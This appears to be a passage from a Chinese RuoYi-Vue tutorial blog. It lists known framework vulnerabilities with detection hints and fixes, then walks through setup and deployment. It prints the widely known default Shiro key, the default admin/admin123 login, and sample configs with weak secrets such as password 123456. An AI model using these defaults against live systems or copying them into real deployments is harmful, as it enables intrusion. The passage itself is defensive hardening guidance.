		<span class="token class-name">String</span> downloadPath <span class="token operator">=</span> localPath <span class="token operator">+</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">substringAfter</span><span class="token punctuation">(</span>resource<span class="token punctuation">,</span> <span class="token class-name">Constants</span><span class="token punctuation">.</span>RESOURCE_PREFIX<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// 下载名称</span>
		<span class="token class-name">String</span> downloadName <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">substringAfterLast</span><span class="token punctuation">(</span>downloadPath<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token class-name">MediaType</span><span class="token punctuation">.</span>APPLICATION_OCTET_STREAM_VALUE<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">setAttachmentResponseHeader</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> downloadName<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">writeBytes</span><span class="token punctuation">(</span>downloadPath<span class="token punctuation">,</span> response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"下载文件失败"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">/**
 * 检查文件是否可下载
 * 
 * @param resource 需要下载的文件
 * @return true 正常 false 非法
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">checkAllowDownload</span><span class="token punctuation">(</span><span class="token class-name">String</span> resource<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">// 禁止目录上跳级别</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>resource<span class="token punctuation">,</span> <span class="token string">".."</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// 检查允许下载的文件规则</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">ArrayUtils</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token class-name">MimeTypeUtils</span><span class="token punctuation">.</span>DEFAULT_ALLOWED_EXTENSION<span class="token punctuation">,</span> <span class="token class-name">FileTypeUtils</span><span class="token punctuation">.</span><span class="token function">getFileType</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// 不在允许下载的文件规则</span>
	<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<ul><li>Spring Framework反射型文件下载漏洞 <code>RuoYi &lt; v4.5.0</code></li></ul>
<p>VMware Tanzu发布安全公告，在Spring Framework版本5.2.0-5.2.8、5.1.0-5.1.17、5.0.0-5.0.18、4.3.0-4.3.28和较旧的不受支持的版本中，公布了一个存在于Spring Framework中的反射型文件下载（Reflected File Download,RFD）漏洞（CVE-2020-5421）。</p>
<p>CVE-2020-5421漏洞可通过jsessionid路径参数，绕过防御RFD攻击的保护。攻击者通过向用户发送带有批处理脚本扩展名的URL，使用户下载并执行文件，从而危害系统。VMware Tanzu官方已发布修复漏洞的新版本。</p>
<p>解决方案：升级<code>spring-boot-starter</code>版本到 <code>&gt;=2.1.17</code>。</p>
<ul><li>Shiro阻止权限绕过漏洞 <code>RuoYi &lt; v4.4.0</code></li></ul>
<p>Shiro &lt; 1.6.0 版本存在一处权限绕过漏洞，由于 <code>shiro</code> 在处理 <code>url</code> 时与 <code>spring</code> 存在差异，处理身份验证请求时出错导致依然存在身份校验绕过漏洞，远程攻击者可以发送特制的 HTTP 请求，绕过身份验证过程并获得对应用程序的未授权访问。</p>
<p>检测漏洞：<code>pom.xml</code> <code>Shiro &lt; 1.6.0</code> 则版本存在漏洞。</p>
<p>解决方案：升级版本到 <code>&gt;=1.6.0</code>。</p>
<ul><li>命令执行漏洞 <code>RuoYi &lt;= v4.3.0</code></li></ul>
<p>若依管理系统使用了Apache Shiro，Shiro 提供了记住我（RememberMe）的功能，下次访问时无需再登录即可访问。系统将密钥硬编码在代码里，且在官方文档中并没有强调修改该密钥，导致框架使用者大多数都使用了默认密钥。攻击者可以构造一个恶意的对象，并且对其序列化、AES加密、base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞，进而在目标机器上执行任意命令。</p>
<p>检测漏洞：<code>ShiroConfig.java</code> 是否包含 <code>fCq+/xW488hMTCD+cmJ3aQ==</code>，如果是使用的默认密钥则需要修改，防止被执行命令攻击。</p>
<p>解决方案：升级版本到 <code>&gt;=v.4.3.1</code>，并且重新生成一个新的秘钥替换<code>cipherKey</code>，保证唯一且不要泄漏。</p>
<pre><code class="prism language-yml"><span class="token comment"># Shiro</span>
<span class="token key atrule">shiro</span><span class="token punctuation">:</span>
  <span class="token key atrule">cookie</span><span class="token punctuation">:</span>
    <span class="token comment"># 设置密钥，务必保持唯一性（生成方式，直接拷贝到main运行即可）KeyGenerator keygen = KeyGenerator.getInstance("AES"); SecretKey deskey = keygen.generateKey(); System.out.println(Base64.encodeToString(deskey.getEncoded()));</span>
    <span class="token key atrule">cipherKey</span><span class="token punctuation">:</span> zSyK5Kp6PZAAjlT+eeNMlg==
</code></pre>
<pre><code class="prism language-java"><span class="token comment">// 直接拷贝到main运行即可生成一个Base64唯一字符串</span>
<span class="token class-name">KeyGenerator</span> keygen <span class="token operator">=</span> <span class="token class-name">KeyGenerator</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">SecretKey</span> deskey <span class="token operator">=</span> keygen<span class="token punctuation">.</span><span class="token function">generateKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>deskey<span class="token punctuation">.</span><span class="token function">getEncoded</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<ul><li>SQL注入攻击 <code>RuoYi &lt;= v3.2.0</code></li></ul>
<p>若依管理系统使用了PageHelper，PageHelper提供了排序（Order by）的功能，前端直接传参完成排序。系统没有做字符检查，导致存在被注入的风险，最终造成数据库中存储的隐私信息全部泄漏。</p>
<p>检测漏洞：<code>BaseController.java</code> 是否包含 <code>String orderBy = pageDomain.getOrderBy();</code>，如果没有字符检查需要修改，防止被执行注入攻击。</p>
<p>解决方案：升级版本到 <code>&gt;=v.3.2.0</code>，或者重新添加字符检查<code>String orderBy = SqlUtil.escapeOrderBySql(pageDomain.getOrderBy());</code>，防止注入绕过。</p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>sql</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>exception<span class="token punctuation">.</span>base<span class="token punctuation">.</span></span><span class="token class-name">BaseException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">StringUtils</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * sql操作工具类
 * 
 * @author ruoyi
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SqlUtil</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token comment">/**
     * 仅支持字母、数字、下划线、空格、逗号、小数点（支持多个字段排序）
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> SQL_PATTERN <span class="token operator">=</span> <span class="token string">"[a-zA-Z0-9_\\ \\,\\.]+"</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * 检查字符，防止注入绕过
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">escapeOrderBySql</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isValidOrderBySql</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BaseException</span><span class="token punctuation">(</span><span class="token string">"参数不符合规范，不能进行查询"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 验证 order by 语法是否符合规范
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isValidOrderBySql</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> value<span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span>SQL_PATTERN<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<ul><li>Shiro阻止权限绕过漏洞 <code>RuoYi &lt;= v4.3.0</code></li></ul>
<p>Shiro &lt; 1.5.2 版本存在一处权限绕过漏洞，当受影响版本的Shiro框架结合Spring dynamic controllers使用时，未经授权的远程攻击者可以通过精心构造的请求包进行权限绕过，可能造成鉴权系统失效以及后台功能暴露。</p>
<p>检测漏洞：<code>pom.xml</code> <code>Shiro &lt;=1.5.2</code> 则版本存在漏洞。</p>
<p>解决方案：升级版本到 <code>&gt;=1.5.3</code>。</p>
<ul><li>Fastjson高危漏洞 <code>RuoYi &lt;= v4.2.0</code></li></ul>
<p>Fastjson &lt; 1.2.68 版本存在一处反序列化漏洞，主要为autoType开关绕过的反序列化漏洞利用，恶意攻击者可以通过该漏洞绕过autoType限制实现远程代码执行攻击，从而获取目标系统管理权限，建议尽快更新漏洞修复版本或采用临时缓解措施加固系统。</p>
<p>检测漏洞：<code>pom.xml</code> <code>Fastjson &lt;=1.2.68</code> 则版本存在漏洞。</p>
<p>解决方案：升级版本到 <code>&gt;=1.2.70</code>。</p>
<p>注意</p>
<p>若依平台的默认口令 admin/admin123，请大家在线上环境一定要修改超级管理员的密码。<br/> <code>SysPasswordService.encryptPassword(String username, String password, String salt)</code><br/> 直接到main运行此方法，填充账号密码及盐（保证唯一），生成md5加密字符串。</p>
<ul><li></li></ul>
<h2><a id="_468"></a>二、环境部署</h2>
<hr/>
<h3><a id="1_474"></a>1、准备工作</h3>
<pre><code class="prism language-tex">JDK &gt;= 1.8(推荐使用1.8版本)
Mysql &gt;= 5.7.0 (建议使用5.7.0)
redis &gt;= 3.0(6.0.8)
Maven &gt;= 3.0(3.6.3)
node.js &gt;=12
idea
</code></pre>
<p>小提示：</p>
<p>前端安装 完node后，最好设置一下淘宝的镜像源，不建议使用cnpm进行安装（可能会出现许多奇奇怪怪的问题）；</p>
<h3><a id="2_489"></a>2、后端运行</h3>
<p>2.1、先去gitee下载运行代码:https://gitee.com/y_project/RuoYi-Vue</p>
<p>2.2、解压下载的 文件，把文件中文件名为 ruoyi-ui（这个文件是前端文件夹） 的文件单独剪切出来，然后用 idea 打开剩下的文件idea 会自动加载Maven依赖包，</p>
<p>2.3、创建数据库<code>ry</code>并导入数据脚本<code>ry_2021xxxx.sql</code>，<code>quartz.sql</code>(脚本在sql文件夹中)</p>
<p>2.4、修改yml文件 application9-druid.yml 链接数据库库名，用户名和密码；</p>
<p><strong>注：修改的配置文件夹在<em>ruoyi-admin</em>模块中</strong></p>
<h3><a id="3_501"></a>3、配置文件(这里是我自己的配置文件)</h3>
<h4><a id="31_applicationyml_505"></a>3.1、通用配置 <code>application.yml</code></h4>
<pre><code class="prism language-yml"><span class="token comment"># 项目相关配置</span>
<span class="token key atrule">ruoyi</span><span class="token punctuation">:</span>
  <span class="token comment"># 名称</span>
  <span class="token key atrule">name</span><span class="token punctuation">:</span> RuoYi
  <span class="token comment"># 版本</span>
  <span class="token key atrule">version</span><span class="token punctuation">:</span> 3.8.1
  <span class="token comment"># 版权年份</span>
  <span class="token key atrule">copyrightYear</span><span class="token punctuation">:</span> <span class="token number">2022</span>
  <span class="token comment"># 实例演示开关</span>
  <span class="token key atrule">demoEnabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token comment"># 文件路径 示例（ Windows配置D:/ruoyi/uploadPath，Linux配置 /home/ruoyi/uploadPath）</span>
  <span class="token key atrule">profile</span><span class="token punctuation">:</span> D<span class="token punctuation">:</span>/ruoyi/uploadPath
  <span class="token comment"># 获取ip地址开关</span>
  <span class="token key atrule">addressEnabled</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
  <span class="token comment"># 验证码类型 math 数组计算 char 字符验证</span>
  <span class="token key atrule">captchaType</span><span class="token punctuation">:</span> math

<span class="token comment"># 开发环境配置</span>
<span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token comment"># 服务器的HTTP端口，默认为8080</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">8080</span>
  <span class="token key atrule">servlet</span><span class="token punctuation">:</span>
    <span class="token comment"># 应用的访问路径</span>
    <span class="token key atrule">context-path</span><span class="token punctuation">:</span> /
  <span class="token key atrule">tomcat</span><span class="token punctuation">:</span>
    <span class="token comment"># tomcat的URI编码</span>
    <span class="token key atrule">uri-encoding</span><span class="token punctuation">:</span> UTF<span class="token punctuation">-</span><span class="token number">8</span>
    <span class="token comment"># 连接数满后的排队数，默认为100</span>
    <span class="token key atrule">accept-count</span><span class="token punctuation">:</span> <span class="token number">1000</span>
    <span class="token key atrule">threads</span><span class="token punctuation">:</span>
      <span class="token comment"># tomcat最大线程数，默认为200</span>
      <span class="token key atrule">max</span><span class="token punctuation">:</span> <span class="token number">800</span>
      <span class="token comment"># Tomcat启动初始化的线程数，默认值10</span>
      <span class="token key atrule">min-spare</span><span class="token punctuation">:</span> <span class="token number">100</span>

<span class="token comment"># 日志配置</span>
<span class="token key atrule">logging</span><span class="token punctuation">:</span>
  <span class="token key atrule">level</span><span class="token punctuation">:</span>
    <span class="token key atrule">com.ruoyi</span><span class="token punctuation">:</span> debug
    <span class="token key atrule">org.springframework</span><span class="token punctuation">:</span> warn

<span class="token comment"># Spring配置</span>
<span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token comment"># 资源信息</span>
  <span class="token key atrule">messages</span><span class="token punctuation">:</span>
    <span class="token comment"># 国际化资源文件路径</span>
    <span class="token key atrule">basename</span><span class="token punctuation">:</span> i18n/messages
  <span class="token key atrule">profiles</span><span class="token punctuation">:</span> 
    <span class="token key atrule">active</span><span class="token punctuation">:</span> druid
  <span class="token comment"># 文件上传</span>
  <span class="token key atrule">servlet</span><span class="token punctuation">:</span>
     <span class="token key atrule">multipart</span><span class="token punctuation">:</span>
       <span class="token comment"># 单个文件大小</span>
       <span class="token key atrule">max-file-size</span><span class="token punctuation">:</span>  10MB
       <span class="token comment"># 设置总上传的文件大小</span>
       <span class="token key atrule">max-request-size</span><span class="token punctuation">:</span>  20MB
  <span class="token comment"># 服务模块</span>
  <span class="token key atrule">devtools</span><span class="token punctuation">:</span>
    <span class="token key atrule">restart</span><span class="token punctuation">:</span>
      <span class="token comment"># 热部署开关</span>
      <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token comment"># redis 配置</span>
  <span class="token key atrule">redis</span><span class="token punctuation">:</span>
    <span class="token comment"># 地址</span>
    <span class="token key atrule">host</span><span class="token punctuation">:</span> localhost
    <span class="token comment"># 端口，默认为6379</span>
    <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">6379</span>
    <span class="token comment"># 数据库索引</span>
    <span class="token key atrule">database</span><span class="token punctuation">:</span> <span class="token number">0</span>
    <span class="token comment"># 密码</span>
    <span class="token key atrule">password</span><span class="token punctuation">:</span> 
    <span class="token comment"># 连接超时时间</span>
    <span class="token key atrule">timeout</span><span class="token punctuation">:</span> 10s
    <span class="token key atrule">lettuce</span><span class="token punctuation">:</span>
      <span class="token key atrule">pool</span><span class="token punctuation">:</span>
        <span class="token comment"># 连接池中的最小空闲连接</span>
        <span class="token key atrule">min-idle</span><span class="token punctuation">:</span> <span class="token number">0</span>
        <span class="token comment"># 连接池中的最大空闲连接</span>
        <span class="token key atrule">max-idle</span><span class="token punctuation">:</span> <span class="token number">8</span>
        <span class="token comment"># 连接池的最大数据库连接数</span>
        <span class="token key atrule">max-active</span><span class="token punctuation">:</span> <span class="token number">8</span>
        <span class="token comment"># #连接池最大阻塞等待时间（使用负值表示没有限制）</span>
        <span class="token key atrule">max-wait</span><span class="token punctuation">:</span> <span class="token punctuation">-</span>1ms

<span class="token comment"># token配置</span>
<span class="token key atrule">token</span><span class="token punctuation">:</span>
    <span class="token comment"># 令牌自定义标识</span>
    <span class="token key atrule">header</span><span class="token punctuation">:</span> Authorization
    <span class="token comment"># 令牌密钥</span>
    <span class="token key atrule">secret</span><span class="token punctuation">:</span> abcdefghijklmnopqrstuvwxyz
    <span class="token comment"># 令牌有效期（默认30分钟）</span>
    <span class="token key atrule">expireTime</span><span class="token punctuation">:</span> <span class="token number">30</span>
  
<span class="token comment"># MyBatis配置</span>
<span class="token key atrule">mybatis</span><span class="token punctuation">:</span>
    <span class="token comment"># 搜索指定包别名</span>
    <span class="token key atrule">typeAliasesPackage</span><span class="token punctuation">:</span> com.ruoyi.<span class="token important">**.domain</span>
    <span class="token comment"># 配置mapper的扫描，找到所有的mapper.xml映射文件</span>
    <span class="token key atrule">mapperLocations</span><span class="token punctuation">:</span> classpath<span class="token important">*:mapper/**/*Mapper.xml</span>
    <span class="token comment"># 加载全局的配置文件</span>
    <span class="token key atrule">configLocation</span><span class="token punctuation">:</span> classpath<span class="token punctuation">:</span>mybatis/mybatis<span class="token punctuation">-</span>config.xml

<span class="token comment"># PageHelper分页插件</span>
<span class="token key atrule">pagehelper</span><span class="token punctuation">:</span> 
  <span class="token key atrule">helperDialect</span><span class="token punctuation">:</span> mysql
  <span class="token key atrule">supportMethodsArguments</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">params</span><span class="token punctuation">:</span> count=countSql 

<span class="token comment"># Swagger配置</span>
<span class="token key atrule">swagger</span><span class="token punctuation">:</span>
  <span class="token comment"># 是否开启swagger</span>
  <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token comment"># 请求前缀</span>
  <span class="token key atrule">pathMapping</span><span class="token punctuation">:</span> /dev<span class="token punctuation">-</span>api

<span class="token comment"># 防止XSS攻击</span>
<span class="token key atrule">xss</span><span class="token punctuation">:</span> 
  <span class="token comment"># 过滤开关</span>
  <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token comment"># 排除链接（多个用逗号分隔）</span>
  <span class="token key atrule">excludes</span><span class="token punctuation">:</span> /system/notice
  <span class="token comment"># 匹配链接</span>
  <span class="token key atrule">urlPatterns</span><span class="token punctuation">:</span> /system/*<span class="token punctuation">,</span>/monitor/*<span class="token punctuation">,</span>/tool/*

</code></pre>
<h4><a id="32_applicationdruidyml_634"></a>3.2、数据源配置 <code>application-druid.yml</code></h4>
<pre><code class="prism language-yml"><span class="token comment"># 数据源配置</span>
<span class="token key atrule">spring</span><span class="token punctuation">:</span>
    <span class="token key atrule">datasource</span><span class="token punctuation">:</span>
        <span class="token key atrule">type</span><span class="token punctuation">:</span> com.alibaba.druid.pool.DruidDataSource
        <span class="token key atrule">driverClassName</span><span class="token punctuation">:</span> com.mysql.cj.jdbc.Driver
        <span class="token key atrule">druid</span><span class="token punctuation">:</span>
            <span class="token comment"># 主库数据源</span>
            <span class="token key atrule">master</span><span class="token punctuation">:</span>
                <span class="token key atrule">url</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>3306/ry<span class="token punctuation">?</span>useUnicode=true<span class="token important">&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8</span>
                <span class="token key atrule">username</span><span class="token punctuation">:</span> root
                <span class="token key atrule">password</span><span class="token punctuation">:</span> <span class="token number">123456</span>
            <span class="token comment"># 从库数据源</span>
            <span class="token key atrule">slave</span><span class="token punctuation">:</span>
                <span class="token comment"># 从数据源开关/默认关闭</span>
                <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
                <span class="token key atrule">url</span><span class="token punctuation">:</span> 
                <span class="token key atrule">username</span><span class="token punctuation">:</span> 
                <span class="token key atrule">password</span><span class="token punctuation">:</span> 
            <span class="token comment"># 初始连接数</span>
            <span class="token key atrule">initialSize</span><span class="token punctuation">:</span> <span class="token number">5</span>
            <span class="token comment"># 最小连接池数量</span>
            <span class="token key atrule">minIdle</span><span class="token punctuation">:</span> <span class="token number">10</span>
            <span class="token comment"># 最大连接池数量</span>
            <span class="token key atrule">maxActive</span><span class="token punctuation">:</span> <span class="token number">20</span>
            <span class="token comment"># 配置获取连接等待超时的时间</span>
            <span class="token key atrule">maxWait</span><span class="token punctuation">:</span> <span class="token number">60000</span>
            <span class="token comment"># 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒</span>
            <span class="token key atrule">timeBetweenEvictionRunsMillis</span><span class="token punctuation">:</span> <span class="token number">60000</span>
            <span class="token comment"># 配置一个连接在池中最小生存的时间，单位是毫秒</span>
            <span class="token key atrule">minEvictableIdleTimeMillis</span><span class="token punctuation">:</span> <span class="token number">300000</span>
            <span class="token comment"># 配置一个连接在池中最大生存的时间，单位是毫秒</span>
            <span class="token key atrule">maxEvictableIdleTimeMillis</span><span class="token punctuation">:</span> <span class="token number">900000</span>
            <span class="token comment"># 配置检测连接是否有效</span>
            <span class="token key atrule">validationQuery</span><span class="token punctuation">:</span> SELECT 1 FROM DUAL
            <span class="token key atrule">testWhileIdle</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
            <span class="token key atrule">testOnBorrow</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
            <span class="token key atrule">testOnReturn</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
            <span class="token key atrule">webStatFilter</span><span class="token punctuation">:</span> 
                <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
            <span class="token key atrule">statViewServlet</span><span class="token punctuation">:</span>
                <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
                <span class="token comment"># 设置白名单，不填则允许所有访问</span>
                <span class="token key atrule">allow</span><span class="token punctuation">:</span>
                <span class="token key atrule">url-pattern</span><span class="token punctuation">:</span> /druid/*
                <span class="token comment"># 控制台管理用户名和密码</span>
                <span class="token key atrule">login-username</span><span class="token punctuation">:</span> ruoyi
                <span class="token key atrule">login-password</span><span class="token punctuation">:</span> <span class="token number">123456</span>
            <span class="token key atrule">filter</span><span class="token punctuation">:</span>
                <span class="token key atrule">stat</span><span class="token punctuation">:</span>
                    <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
                    <span class="token comment"># 慢SQL记录</span>
                    <span class="token key atrule">log-slow-sql</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
                    <span class="token key atrule">slow-sql-millis</span><span class="token punctuation">:</span> <span class="token number">1000</span>
                    <span class="token key atrule">merge-sql</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
                <span class="token key atrule">wall</span><span class="token punctuation">:</span>
                    <span class="token key atrule">config</span><span class="token punctuation">:</span>
                        <span class="token key atrule">multi-statement-allow</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
</code></pre>
<p>2.5、启动 redis（redis-server.exe）</p>
<p>2.6、打开项目运行<code>com.ruoyi.RuoYiApplication.java</code>，出现如下图表示启动成功。</p>
<pre><code class="prism language-text">(♥◠‿◠)ﾉﾞ  若依启动成功   ლ(´ڡ`ლ)ﾞ  
 .-------.       ____     __        
 |  _ _   \      \   \   /  /    
 | ( ' )  |       \  _. /  '       
 |(_ o _) /        _( )_ .'         
 | (_,_).' __  ___(_ o _)'          
 |  |\ \  |  ||   |(_,_)'         
 |  | \ `'   /|   `-'  /           
 |  |  \    /  \      /           
 ''-'   `'-'    `-..-'    
</code></pre>
<p>小提示：</p>
<pre><code class="prism language-tex">后端运行成功可以通过([http://localhost:8080 (opens new window)](http://localhost:8080/))访问，但是不会出现静态页面，可以继续参考下面步骤部署`ruoyi-ui`前端，然后通过前端地址来访问。
</code></pre>
<h3><a id="4_723"></a>4、前端运行</h3>
<pre><code class="prism language-bash"><span class="token comment"># 进入项目目录</span>
<span class="token builtin class-name">cd</span> ruoyi-ui

<span class="token comment"># 安装依赖</span>
<span class="token function">npm</span> <span class="token function">install</span>

<span class="token comment"># 强烈建议不要用直接使用 cnpm 安装，会有各种诡异的 bug，可以通过重新指定 registry 来解决 npm 安装速度慢的问题。</span>
<span class="token function">npm</span> <span class="token function">install</span> --registry<span class="token operator">=</span>https://registry.npm.taobao.org

<span class="token comment"># 本地开发 启动项目</span>
<span class="token function">npm</span> run dev
</code></pre>
<p>4、打开浏览器，输入：(<a href="http://localhost/">http://localhost:80 (opens new window)</a>) 默认账户/密码 <code>admin/admin123</code>）<br/> 若能正确展示登录页面，并能成功登录，菜单及页面展示正常，则表明环境搭建成功</p>
<p>建议使用<code>Git</code>克隆，因为克隆的方式可以和<code>RuoYi</code>随时保持更新同步。使用<code>Git</code>命令克隆</p>
<pre><code class="prism language-text">git clone https://gitee.com/y_project/RuoYi-Vue.git
</code></pre>
<p>小提示：</p>
<pre><code class="prism language-tex">因为本项目是前后端完全分离的，所以需要前后端都单独启动好，才能进行访问。
前端安装完node后，最好设置下淘宝的镜像源，不建议使用cnpm（可能会出现奇怪的问题）
</code></pre>
<h2><a id="_755"></a>三、部署系统</h2>
<hr/>
<p>小提示：</p>
<pre><code class="prism language-tex">因为本项目是前后端完全分离的，所以需要前后端都单独部署好，才能进行访问。
</code></pre>
<h3><a id="1_765"></a>.1、后端部署</h3>
<ul><li>打包工程文件</li></ul>
<pre><code class="prism language-tex">在`ruoyi`项目的`bin`目录下执行`package.bat`打包Web工程，生成war/jar包文件。
然后会在项目下生成`target`文件夹包含`war`或`jar`
</code></pre>
<p>小提示：</p>
<pre><code class="prism language-tex">多模块版本会生成在`ruoyi/ruoyi-admin`模块下`target`文件夹
</code></pre>
<ul><li>部署工程文件</li></ul>
<p>1、jar部署方式</p>
<pre><code class="prism language-tex">使用命令行执行：`java –jar ruoyi.jar` 或者执行脚本：`ruoyi/bin/run.bat`
</code></pre>
<p>2、war部署方式</p>
<pre><code class="prism language-tex">`ruoyi/pom.xml`中的`packaging`修改为`war`，放入`tomcat`服务器`webapps`
</code></pre>
<pre><code class="prism language-xml">   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>packaging</span><span class="token punctuation">&gt;</span></span>war<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>packaging</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>小提示：</p>
<p>多模块版本在<code>ruoyi/ruoyi-admin</code>模块下修改<code>pom.xml</code></p>
<ul><li><code>SpringBoot</code>去除内嵌<code>Tomcat</code>（PS：此步骤不重要，因为不排除也能在容器中部署<code>war</code>）</li></ul>
<pre><code class="prism language-xml"><span class="token comment">&lt;!-- 多模块排除内置tomcat --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
